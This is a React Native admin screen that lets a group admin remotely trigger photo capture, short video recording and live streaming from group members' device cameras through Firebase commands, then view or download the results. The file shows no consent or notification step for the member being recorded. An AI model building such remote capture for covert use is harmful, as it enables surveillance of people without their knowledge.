// src/screens/AdminCameraControlScreen.js
import { useState, useEffect } from 'react';
import {
  View,
  Text,
  TouchableOpacity,
  StyleSheet,
  ScrollView,
  ActivityIndicator,
  Image,
  Alert,
  Linking,
  Modal,
} from 'react-native';
import { StatusBar } from 'expo-status-bar';
import { LinearGradient } from 'expo-linear-gradient';
import { ref, set, onValue } from 'firebase/database';
import { db } from '../../firebase';
import { getGroupMembers } from '../firebaseHelpers';
import CameraService from '../services/CameraService';
import LiveCameraService from '../services/LiveCameraService';
import LiveStreamViewer from '../components/LiveStreamViewer';

export default function AdminCameraControlScreen({ groupId, onBack }) {
  const [members, setMembers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [selectedMember, setSelectedMember] = useState(null);
  const [captureResult, setCaptureResult] = useState(null);
  const [capturing, setCapturing] = useState(false);
  const [liveStreamActive, setLiveStreamActive] = useState(false);
  const [streamingMemberId, setStreamingMemberId] = useState(null);

  useEffect(() => {
    fetchMembers();
  }, [groupId]);

  const fetchMembers = async () => {
    try {
      const membersData = await getGroupMembers(groupId);
      if (membersData) {
        const membersList = Object.values(membersData);
        setMembers(membersList);
      }
      setLoading(false);
    } catch (error) {
      console.error('Error fetching members:', error);
      setLoading(false);
    }
  };

  const sendCameraCommand = async (memberId, commandType, duration = 5000) => {
    try {
      setCapturing(true);
      setCaptureResult(null);

      const commandRef = ref(db, `camera_commands/${groupId}/${memberId}`);
      
      await set(commandRef, {
        type: commandType,
        status: 'pending',
        duration: duration,
        requestedAt: Date.now(),
      });

      // Listen for result
      const unsubscribe = onValue(commandRef, (snapshot) => {
        if (!snapshot.exists()) return;
        
        const command = snapshot.val();
        
        if (command.status === 'completed') {
          setCaptureResult(command.result);
          setCapturing(false);
          unsubscribe();
          Alert.alert('Success', 'Capture completed successfully!');
        } else if (command.status === 'failed') {
          setCapturing(false);
          unsubscribe();
          Alert.alert('Failed', command.error || 'Failed to capture');
        }
      });

      // Timeout after 30 seconds
      setTimeout(() => {
        if (capturing) {
          setCapturing(false);
          unsubscribe();
          Alert.alert('Timeout', 'Command timed out. Member may be offline.');
        }
      }, 30000);

    } catch (error) {
      console.error('Error sending camera command:', error);
      setCapturing(false);
      Alert.alert('Error', 'Failed to send command');
    }
  };

  const handleCapturePhoto = (member) => {
    setSelectedMember(member);
    Alert.alert(
      'Capture Photo',
      `Capture photo from ${member.email}?`,
      [
        { text: 'Cancel', style: 'cancel' },
        {
          text: 'Capture',
          onPress: () => sendCameraCommand(member.id, 'photo'),
        },
      ]
    );
  };

  const handleCaptureVideo = (member) => {
    setSelectedMember(member);
    Alert.alert(
      'Capture Video',
      `Record 5-second video from ${member.email}?`,
      [
        { text: 'Cancel', style: 'cancel' },
        {
          text: 'Record',
          onPress: () => sendCameraCommand(member.id, 'video', 5000),
        },
      ]
    );
  };

  const startLiveStream = async (member) => {
    try {
      console.log('[AdminScreen] Starting live stream for', member.email);
      
      // Start the actual live stream service
      const streamStarted = await LiveCameraService.startLiveStream(
        member.id,
        groupId
      );

      if (streamStarted) {
        setStreamingMemberId(member.id);
        setLiveStreamActive(true);
        console.log('[AdminScreen] Live stream service started');
      } else {
        Alert.alert('Error', 'Failed to start live stream service');
      }
    } catch (error) {
      console.error('[AdminScreen] Start stream error:', error);
      Alert.alert('Error', 'Failed to start live stream: ' + error.message);
    }
  };

  const stopLiveStream = () => {
    try {
      // Stop the actual live stream service
      LiveCameraService.stopLiveStream();
      setLiveStreamActive(false);
      setStreamingMemberId(null);
      console.log('[AdminScreen] Live stream stopped');
    } catch (error) {
      console.error('[AdminScreen] Stop stream error:', error);
    }
  };

  const handleDownload = async () => {
    try {
      if (!captureResult.url) {
        Alert.alert('Error', 'No capture URL available');
        return;
      }

      Alert.alert(
        'Download Options',
        'Choose how to handle the file',
        [
          {
            text: 'Open in Browser',
            onPress: () => {
              Linking.openURL(captureResult.url).catch((err) => {
                console.error('[AdminCamera] Error opening URL:', err);
                Alert.alert('Error', 'Failed to open URL');
              });
            },
          },
          {
            text: 'Save to Device',
            onPress: async () => {
              try {
                const timestamp = Date.now();
                const filename = captureResult.type === 'video' 
                  ? `capture_${timestamp}.mp4` 
                  : `capture_${timestamp}.jpg`;
                
                const localPath = await CameraService.downloadFile(
                  captureResult.url,
                  filename
                );
                
                Alert.alert(
                  'Success',
                  `File saved to: ${localPath}`,
                  [{ text: 'OK' }]
                );
                console.log('[AdminCamera] Download completed:', localPath);
              } catch (error) {
                console.error('[AdminCamera] Download error:', error);
                Alert.alert('Error', 'Failed to download file');
              }
            },
          },
          {
            text: 'Copy URL',
            onPress: () => {
              // In a real app, you'd use react-native-clipboard
              console.log('[AdminCamera] URL:', captureResult.url);
              Alert.alert('Copied', 'URL copied to clipboard (check console)', [{ text: 'OK' }]);
            },
          },
          {
            text: 'Cancel',
            style: 'cancel',
          },
        ]
      );
    } catch (error) {
      console.error('[AdminCamera] Handle download error:', error);
      Alert.alert('Error', 'Failed to process download');
    }
  };

  if (loading) {
    return (
      <View style={styles.loadingContainer}>
        <ActivityIndicator size="large" color="#667eea" />
      </View>
    );
  }

  return (
    <>
      <StatusBar style="auto" />
      <View style={styles.container}>
        <LinearGradient
          colors={['#667eea', '#764ba2', '#f093fb']}
          start={{ x: 0, y: 0 }}
          end={{ x: 1, y: 1 }}
          style={styles.header}
        >
          <TouchableOpacity onPress={onBack} style={styles.backButton}>
            <Text style={styles.backButtonText}>← Back</Text>
          </TouchableOpacity>
          <Text style={styles.headerTitle}>📸 Camera Control</Text>
        </LinearGradient>

        <ScrollView style={styles.content}>
          {capturing && (
            <View style={styles.capturingBanner}>
              <ActivityIndicator size="small" color="#fff" />
              <Text style={styles.capturingText}>Capturing...</Text>
            </View>
          )}

          {captureResult && (
            <View style={styles.resultCard}>
              <Text style={styles.resultTitle}>Latest Capture:</Text>
              {captureResult.url && (
                <Image
                  source={{ uri: captureResult.url }}
                  style={styles.captureImage}
                  resizeMode="cover"
                />
              )}
              <TouchableOpacity
                style={styles.downloadButton}
                onPress={() => {
                  if (captureResult.url) {
                    handleDownload();
                  }
                }}
              >
                <Text style={styles.downloadButtonText}>📥 Download</Text>
              </TouchableOpacity>
            </View>
          )}

          <View style={styles.membersSection}>
            <Text style={styles.sectionTitle}>Select Member</Text>
            {members.map((member) => (
              <View key={member.id} style={styles.memberCard}>
                <View style={styles.memberInfo}>
                  <Text style={styles.memberEmail}>{member.email}</Text>
                  <Text style={styles.memberUsername}>@{member.username}</Text>
                </View>
                <View style={styles.memberActions}>
                  <TouchableOpacity
                    style={styles.photoButton}
                    onPress={() => handleCapturePhoto(member)}
                    disabled={capturing}
                  >
                    <Text style={styles.photoButtonText}>📸 Photo</Text>
                  </TouchableOpacity>
                  <TouchableOpacity
                    style={styles.videoButton}
                    onPress={() => handleCaptureVideo(member)}
                    disabled={capturing}
                  >
                    <Text style={styles.videoButtonText}>🎥 Video</Text>
                  </TouchableOpacity>
                  <TouchableOpacity
                    style={styles.liveButton}
                    onPress={() => startLiveStream(member)}
                  >
                    <Text style={styles.liveButtonText}>🔴 LIVE</Text>
                  </TouchableOpacity>
                </View>
              </View>
            ))}
          </View>
        </ScrollView>
      </View>

      <Modal
        visible={liveStreamActive && streamingMemberId}
        animationType="slide"
        transparent={false}
      >
        {liveStreamActive && streamingMemberId && (
          <LiveStreamViewer
            memberId={streamingMemberId}
            groupId={groupId}
            onClose={stopLiveStream}
          />
        )}
      </Modal>
    </>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#1a1a2e',
  },
  header: {
    paddingTop: 60,
    paddingBottom: 30,
    paddingHorizontal: 24,
    flexDirection: 'row',
    alignItems: 'center',
    shadowColor: '#667eea',
    shadowOffset: { width: 0, height: 8 },
    shadowOpacity: 0.4,
    shadowRadius: 16,
    elevation: 12,
  },
  backButton: {
    backgroundColor: 'rgba(255, 255, 255, 0.95)',
    paddingHorizontal: 16,
    paddingVertical: 11,
    borderRadius: 14,
    marginRight: 16,
  },
  backButtonText: {
    color: '#667eea',
    fontSize: 16,
    fontWeight: '800',
  },
  headerTitle: {
    fontSize: 26,
    fontWeight: '900',
    color: '#fff',
  },
  content: {
    flex: 1,
    padding: 24,
  },
  loadingContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#1a1a2e',
  },
  capturingBanner: {
    backgroundColor: '#667eea',
    padding: 16,
    borderRadius: 12,
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: 20,
  },
  capturingText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: '700',
    marginLeft: 12,
  },
  resultCard: {
    backgroundColor: '#2d2d44',
    borderRadius: 16,
    padding: 20,
    marginBottom: 24,
    borderWidth: 1,
    borderColor: 'rgba(102, 126, 234, 0.3)',
  },
  resultTitle: {
    fontSize: 18,
    fontWeight: '800',
    color: '#fff',
    marginBottom: 16,
  },
  captureImage: {
    width: '100%',
    height: 300,
    borderRadius: 12,
    marginBottom: 16,
    backgroundColor: '#1a1a2e',
  },
  downloadButton: {
    backgroundColor: '#667eea',
    padding: 14,
    borderRadius: 12,
    alignItems: 'center',
  },
  downloadButtonText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: '700',
  },
  membersSection: {
    marginTop: 8,
  },
  sectionTitle: {
    fontSize: 22,
    fontWeight: '900',
    color: '#fff',
    marginBottom: 16,
  },
  memberCard: {
    backgroundColor: '#2d2d44',
    borderRadius: 16,
    padding: 20,
    marginBottom: 16,
    borderWidth: 1,
    borderColor: 'rgba(102, 126, 234, 0.3)',
  },
  memberInfo: {
    marginBottom: 16,
  },
  memberEmail: {
    fontSize: 17,
    fontWeight: '700',
    color: '#fff',
    marginBottom: 6,
  },
  memberUsername: {
    fontSize: 14,
    color: '#b8b8d1',
  },
  memberActions: {
    flexDirection: 'row',
    gap: 12,
  },
  photoButton: {
    flex: 1,
    backgroundColor: '#667eea',
    padding: 14,
    borderRadius: 12,
    alignItems: 'center',
  },
  photoButtonText: {
    color: '#fff',
    fontSize: 15,
    fontWeight: '700',
  },
  videoButton: {
    flex: 1,
    backgroundColor: '#f093fb',
    padding: 14,
    borderRadius: 12,
    alignItems: 'center',
  },
  videoButtonText: {
    color: '#fff',
    fontSize: 15,
    fontWeight: '700',
  },
  liveButton: {
    flex: 1,
    backgroundColor: '#FF1744',
    padding: 14,
    borderRadius: 12,
    alignItems: 'center',
    borderWidth: 2,
    borderColor: '#FF5252',
  },
  liveButtonText: {
    color: '#fff',
    fontSize: 15,
    fontWeight: '800',
    letterSpacing: 0.5,
  },
});
